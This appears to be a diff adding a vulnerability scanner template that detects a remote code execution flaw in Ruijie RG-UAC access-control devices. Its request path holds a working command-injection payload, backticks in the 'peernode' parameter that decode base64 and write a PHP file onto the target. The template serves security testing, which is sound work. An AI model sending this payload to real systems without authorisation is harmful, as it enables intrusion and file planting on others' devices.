@@ -1,0 +1,25 @@
+id: rg-uac-rce
+
+info:
+  name: Ruijie RG-UAC Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    RG-UAC (Ruijie Unified Access Control) system is vulnerable to a remote code execution flaw via the /view/vpn/autovpn/online_check.php endpoint.
+  tags: rce,vpn,critical
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/view/vpn/autovpn/online_check.php?peernode=%60echo%20PD9waHAgcGhwaW5mbygpOw==%20%7C%20base64%20-d%20%3E%201.php%60"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "<?php phpinfo()"
